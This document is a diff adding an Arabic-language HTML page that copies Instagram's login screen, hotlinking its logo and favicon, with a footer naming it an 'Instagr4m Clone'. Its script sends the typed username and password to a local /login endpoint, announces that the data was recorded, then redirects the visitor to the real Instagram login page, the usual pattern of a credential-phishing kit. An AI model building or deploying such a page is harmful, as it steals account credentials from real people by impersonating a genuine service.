@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="icon" href="https://www.instagram.com/favicon.ico">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #fff;
+            padding: 40px;
+            border: 1px solid #dbdbdb;
+            border-radius: 10px;
+            width: 350px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 50px;
+        }
+
+        .logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+
+        .form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+
+        .form button {
+            background-color: #0095f6;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .form button:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider::before {
+            margin-right: 10px;
+        }
+
+        .divider::after {
+            margin-left: 10px;
+        }
+
+        .signup {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .signup a {
+            text-decoration: none;
+            color: #0095f6;
+            font-weight: bold;
+        }
+
+        footer {
+            margin-top: auto;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            padding: 20px 0;
+        }
+
+        footer a {
+            text-decoration: none;
+            color: #00376b;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        footer ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        footer ul li {
+            margin: 0 10px;
+        }
+
+        footer ul li a {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+        <form class="form" id="loginForm">
+            <input type="text" name="username" placeholder="اسم المستخدم" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="divider">أو</div>
+        <button style="background: none; border: none; color: #0095f6; font-weight: bold; cursor: pointer;">تسجيل الدخول عبر Facebook</button>
+        <p class="signup">
+            ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
+        </p>
+    </div>
+
+    <footer>
+        <ul>
+            <li><a href="#">حول</a></li>
+            <li><a href="#">المساعدة</a></li>
+            <li><a href="#">الصحافة</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">الوظائف</a></li>
+            <li><a href="#">الخصوصية</a></li>
+            <li><a href="#">الشروط</a></li>
+            <li><a href="#">المواقع</a></li>
+            <li><a href="#">اللغات</a></li>
+        </ul>
+        <p>© 2025 Instagr4m Clone. جميع الحقوق محفوظة.</p>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(Object.fromEntries(formData))
+                });
+
+                const result = await response.json();
+                if (result.status === 'success') {
+                    alert('تم تسجيل البيانات بنجاح!');
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                } else {
+                    alert('حدث خطأ: ' + result.message);
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء معالجة الطلب.');
+            }
+        });
+    </script>
+</body>
+</html>
